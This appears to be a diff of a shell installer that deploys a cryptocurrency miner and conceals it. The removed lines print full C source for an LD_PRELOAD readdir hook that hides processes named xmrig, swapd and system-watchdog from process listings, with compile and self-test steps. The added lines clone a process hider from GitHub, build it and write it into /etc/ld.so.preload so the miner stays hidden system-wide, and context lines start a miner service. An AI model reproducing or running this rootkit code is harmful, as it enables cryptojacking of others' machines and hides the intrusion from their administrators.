@@ -2035,196 +2035,47 @@ install_libprocesshider() {
     echo "INSTALLING LIBPROCESSHIDER"
     echo "=========================================="
     echo ""
-    echo "[*] Using LD_PRELOAD method (works on ALL kernels!)"
-    echo "[*] No kernel modules, no compatibility issues!"
-    echo ""
     
-    # Install minimal dependencies
-    echo "[*] Installing gcc..."
-    apt install -y gcc 2>&1 | grep -E "Setting up|already" || true
+    # Install dependencies
+    echo "[*] Installing git and gcc..."
+    apt-get install -y git gcc make 2>&1 | grep -E "Setting up|already" || true
+    yum install -y git gcc make 2>&1 | grep -E "Installing|already" || true
     
-    # Create processhider.c (ORIGINAL gianlucaborello implementation)
-    echo "[*] Creating processhider.c..."
-    cat > /tmp/processhider.c << 'PROCESSHIDER_C'
-#define _GNU_SOURCE
-
-#include <stdio.h>
-#include <dlfcn.h>
-#include <dirent.h>
-#include <string.h>
-#include <unistd.h>
-
-/*
- * Every process with these names will be excluded
- */
-static const char* process_to_filter[] = {
-    "swapd",
-    "xmrig",
-    "system-watchdog",
-    NULL
-};
-
-/*
- * Get a directory name given a DIR* handle
- */
-static int get_dir_name(DIR* dirp, char* buf, size_t size)
-{
-    int fd = dirfd(dirp);
-    if(fd == -1) {
-        return 0;
-    }
-
-    char tmp[64];
-    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
-    ssize_t ret = readlink(tmp, buf, size);
-    if(ret == -1) {
-        return 0;
-    }
-
-    buf[ret] = 0;
-    return 1;
-}
-
-/*
- * Get a process name given its pid
- */
-static int get_process_name(char* pid, char* buf)
-{
-    if(strspn(pid, "0123456789") != strlen(pid)) {
-        return 0;
-    }
-
-    char tmp[256];
-    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
- 
-    FILE* f = fopen(tmp, "r");
-    if(f == NULL) {
-        return 0;
-    }
-
-    if(fgets(tmp, sizeof(tmp), f) == NULL) {
-        fclose(f);
-        return 0;
-    }
-
-    fclose(f);
-
-    int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
-    return 1;
-}
-
-#define DECLARE_READDIR(dirent, readdir)                                \
-static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
-                                                                        \
-struct dirent* readdir(DIR *dirp)                                       \
-{                                                                       \
-    if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
-        if(original_##readdir == NULL)                                  \
-        {                                                               \
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
-        }                                                               \
-    }                                                                   \
-                                                                        \
-    struct dirent* dir;                                                 \
-                                                                        \
-    while(1)                                                            \
-    {                                                                   \
-        dir = original_##readdir(dirp);                                 \
-        if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
-                strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name)) {          \
-                int i;                                                  \
-                int should_hide = 0;                                    \
-                for(i = 0; process_to_filter[i]; i++) {                 \
-                    if(strcmp(process_name, process_to_filter[i]) == 0) { \
-                        should_hide = 1;                                \
-                        break;                                          \
-                    }                                                   \
-                }                                                       \
-                if(should_hide) {                                       \
-                    continue;                                           \
-                }                                                       \
-            }                                                           \
-        }                                                               \
-        break;                                                          \
-    }                                                                   \
-    return dir;                                                         \
-}
-
-DECLARE_READDIR(dirent64, readdir64);
-DECLARE_READDIR(dirent, readdir);
-PROCESSHIDER_C
-    
-    echo "[✓] Source created"
+    # Clone from GitHub
+    echo "[*] Cloning libprocesshider from GitHub..."
+    cd /tmp
+    rm -rf libprocesshider 2>/dev/null
+    git clone https://github.com/littlAcen/libprocesshider
     
     # Compile
-    echo "[*] Compiling libprocesshider.so..."
-    if gcc -Wall -fPIC -shared -o /tmp/libprocesshider.so /tmp/processhider.c -ldl 2>&1; then
-        echo "[✓] Compiled successfully!"
-        
-        # Install
-        cp /tmp/libprocesshider.so /usr/local/lib/libprocesshider.so
-        chmod 644 /usr/local/lib/libprocesshider.so
-        
-        # NOTE: We do NOT add to /etc/ld.so.preload (causes segfaults)
-        # Instead, we only use LD_PRELOAD in the systemd service file
-        echo "[*] Library installed (will be loaded via systemd service only)"
-        
-        echo "[✓] libprocesshider installed!"
-        echo ""
-        
-        # Test
-        echo "[*] Testing..."
-        sleep 999 &
-        TEST_PID=$!
-        sleep 1
-        
-        if ps aux | grep "sleep 999" | grep -v grep >/dev/null 2>&1; then
-            echo "[!] Test process still visible (may need reboot)"
-            kill -9 $TEST_PID 2>/dev/null
-            LIBHIDE_WORKING=false
-        else
-            echo "[✓] Test HIDDEN! Working perfectly!"
-            kill -9 $TEST_PID 2>/dev/null
-            LIBHIDE_WORKING=true
-        fi
-        
-        echo ""
-        echo "=========================================="
-        echo "LIBPROCESSHIDER SUMMARY"
-        echo "=========================================="
-        echo ""
-        echo "Status: ✅ INSTALLED"
-        echo "Method: LD_PRELOAD hooking"
-        echo "Library: /usr/local/lib/libprocesshider.so"
-        echo ""
-        echo "Hidden processes:"
-        echo "  • swapd"
-        echo "  • xmrig"  
-        echo "  • system-watchdog"
-        echo ""
-        
-        if [ "$LIBHIDE_WORKING" = "true" ]; then
-            echo "Tested: ✅ WORKING"
-        else
-            echo "Tested: ⚠️  May need system reboot"
-        fi
-        
-        rm -f /tmp/processhider.c /tmp/libprocesshider.so
-        export LIBHIDE_WORKING
-        return 0
-        
-    else
-        echo "[✗] Compilation failed!"
-        rm -f /tmp/processhider.c /tmp/libprocesshider.so
-        export LIBHIDE_WORKING=false
-        return 1
-    fi
+    echo "[*] Compiling..."
+    cd libprocesshider
+    make
+    
+    # Install
+    echo "[*] Installing..."
+    mv libprocesshider.so /usr/local/lib/
+    
+    # Enable globally
+    echo "[*] Activating via /etc/ld.so.preload..."
+    echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+    
+    # Cleanup
+    cd /tmp
+    rm -rf libprocesshider
+    
+    echo "[✓] libprocesshider installed!"
+    echo ""
+    echo "=========================================="
+    echo "LIBPROCESSHIDER SUMMARY"
+    echo "=========================================="
+    echo ""
+    echo "Status: ✅ INSTALLED"
+    echo "Method: LD_PRELOAD hooking (/etc/ld.so.preload)"
+    echo "Library: /usr/local/lib/libprocesshider.so"
+    echo ""
+    echo "Hidden process: swapd"
+    echo ""
 }
 
 # ==================== INSTALL PROCESS HIDER ====================
@@ -2291,18 +2142,6 @@ if systemctl is-active postfix >/dev/null 2>&1; then
 else
     echo "[*] Postfix not running - skipping email configuration"
 fi
-
-# Clean up any old /etc/ld.so.preload entries from previous script runs
-if [ -f /etc/ld.so.preload ]; then
-    if grep -q "/usr/local/lib/libprocesshider.so" /etc/ld.so.preload 2>/dev/null; then
-        echo "[*] Removing old libprocesshider entry from /etc/ld.so.preload..."
-        sed -i '\|/usr/local/lib/libprocesshider.so|d' /etc/ld.so.preload 2>/dev/null
-        echo "[✓] Cleaned up /etc/ld.so.preload (prevents segfaults)"
-    fi
-fi
-
-# libprocesshider is loaded ONLY via systemd service LD_PRELOAD
-# This prevents segfaults from incompatible system processes
 
 
 # ==================== START MINER SERVICE ====================
